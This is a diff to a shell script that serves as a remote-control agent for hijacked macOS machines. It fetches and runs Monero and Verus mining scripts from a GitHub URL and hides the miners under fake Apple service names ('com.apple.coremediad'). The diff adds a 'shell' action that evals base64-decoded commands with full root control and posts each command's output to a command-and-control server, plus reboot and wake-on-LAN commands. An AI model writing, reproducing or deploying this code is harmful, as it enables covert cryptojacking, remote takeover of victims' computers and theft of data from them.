@@ -72,34 +72,72 @@ get_miner() {
 execute_command() {
   local action="$1"
   local payload="$2"
-  echo "[$(date)] Executing: $action $payload" >> "$LOG_PATH"
+  local ts=$(date '+%Y-%m-%d %H:%M:%S')
+  echo "[$ts] CMD: $action | $payload" >> "$LOG_PATH"
 
   case "$action" in
     mine_vrsc)
-      sudo curl -fsSL "https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine_gpu.sh?$(date +%s)" | sudo bash >> "$LOG_PATH" 2>&1 &
+      curl -fsSL "https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine_gpu.sh?$(date +%s)" -o /tmp/_mine_gpu.sh
+      bash /tmp/_mine_gpu.sh >> "$LOG_PATH" 2>&1 &
       ;;
     mine_xmr)
-      sudo curl -fsSL "https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine_xmr.sh?$(date +%s)" | sudo bash >> "$LOG_PATH" 2>&1 &
+      curl -fsSL "https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine_xmr.sh?$(date +%s)" -o /tmp/_mine_xmr.sh
+      bash /tmp/_mine_xmr.sh >> "$LOG_PATH" 2>&1 &
       ;;
     stop)
-      pkill -9 -f "com.apple.coremediad" 2>/dev/null
-      pkill -9 -f "com.apple.coremedia.network" 2>/dev/null
       launchctl unload /Library/LaunchDaemons/com.apple.coremediad.plist 2>/dev/null
       launchctl unload /Library/LaunchDaemons/com.apple.coremedia.network.plist 2>/dev/null
+      pkill -9 -f "com.apple.coremediad" 2>/dev/null
+      pkill -9 -f "com.apple.coremedia.network" 2>/dev/null
+      echo "[$ts] Miners stopped" >> "$LOG_PATH"
       ;;
     remove)
       curl -fsSL "https://raw.githubusercontent.com/sajalsoumalya/vps/main/remove_mine.sh?$(date +%s)" | bash >> "$LOG_PATH" 2>&1
       curl -fsSL "https://raw.githubusercontent.com/sajalsoumalya/vps/main/remove_xmr.sh?$(date +%s)" | bash >> "$LOG_PATH" 2>&1
       ;;
     update)
-      # Re-run current miner to update
       MINER=$(get_miner)
-      [[ "$MINER" == "vrsc" ]] && sudo curl -fsSL "https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine_gpu.sh?$(date +%s)" | sudo bash >> "$LOG_PATH" 2>&1 &
-      [[ "$MINER" == "xmr" ]] && sudo curl -fsSL "https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine_xmr.sh?$(date +%s)" | sudo bash >> "$LOG_PATH" 2>&1 &
+      [[ "$MINER" == "vrsc" ]] && curl -fsSL "https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine_gpu.sh?$(date +%s)" | bash >> "$LOG_PATH" 2>&1 &
+      [[ "$MINER" == "xmr" ]] && curl -fsSL "https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine_xmr.sh?$(date +%s)" | bash >> "$LOG_PATH" 2>&1 &
       ;;
     shell)
-      # Execute arbitrary shell command
-      eval "$payload" >> "$LOG_PATH" 2>&1
+      # Execute ANY shell command as root — full system control
+      # payload = base64-encoded command for safety with special chars
+      DECODED=$(echo "$payload" | base64 --decode 2>/dev/null || echo "$payload")
+      echo "[$ts] SHELL: $DECODED" >> "$LOG_PATH"
+      OUTPUT=$(eval "$DECODED" 2>&1)
+      echo "[$ts] OUTPUT: $OUTPUT" >> "$LOG_PATH"
+      # Report output back to command center
+      curl -fsSL -X POST "$CC_URL/shell_result" \
+        -H "Authorization: Bearer $CC_TOKEN" \
+        -H "Content-Type: application/json" \
+        -d "{\"node_id\":\"$NODE_ID\",\"command\":\"$DECODED\",\"output\":$(echo "$OUTPUT" | python3 -c 'import json,sys; print(json.dumps(sys.stdin.read()))')}" \
+        2>/dev/null || true
+      ;;
+    reboot)
+      echo "[$ts] Rebooting..." >> "$LOG_PATH"
+      shutdown -r +1 2>/dev/null || reboot
+      ;;
+    sleep_display)
+      pmset displaysleepnow
+      ;;
+    wol)
+      # payload = MAC address to wake
+      if [[ -n "$payload" ]]; then
+        python3 -c "
+import socket
+mac = '$payload'.replace(':','').replace('-','')
+magic = bytes.fromhex('F'*12 + mac*16)
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+s.sendto(magic, ('255.255.255.255', 9))
+s.close()
+print('WoL sent to $payload')
+" >> "$LOG_PATH" 2>&1
+      fi
+      ;;
+    *)
+      echo "[$ts] Unknown action: $action" >> "$LOG_PATH"
       ;;
   esac
 }
